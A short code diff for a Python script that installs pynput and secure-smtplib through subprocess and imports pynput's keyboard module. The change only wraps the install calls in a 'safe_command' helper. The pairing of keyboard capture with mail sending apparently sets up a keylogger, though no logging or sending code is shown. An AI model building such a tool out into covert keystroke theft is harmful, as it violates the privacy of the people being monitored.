@@ -1,10 +1,11 @@
 import sys
 import subprocess
+from security import safe_command
 
 # implement pip as a subprocess:
 
-subprocess.run([sys.executable, '-m', 'pip', 'install','pynput'])
-subprocess.run([sys.executable, '-m', 'pip', 'install','secure-smtplib'])
+safe_command.run(subprocess.run, [sys.executable, '-m', 'pip', 'install','pynput'])
+safe_command.run(subprocess.run, [sys.executable, '-m', 'pip', 'install','secure-smtplib'])
 
 
 from pynput import keyboard
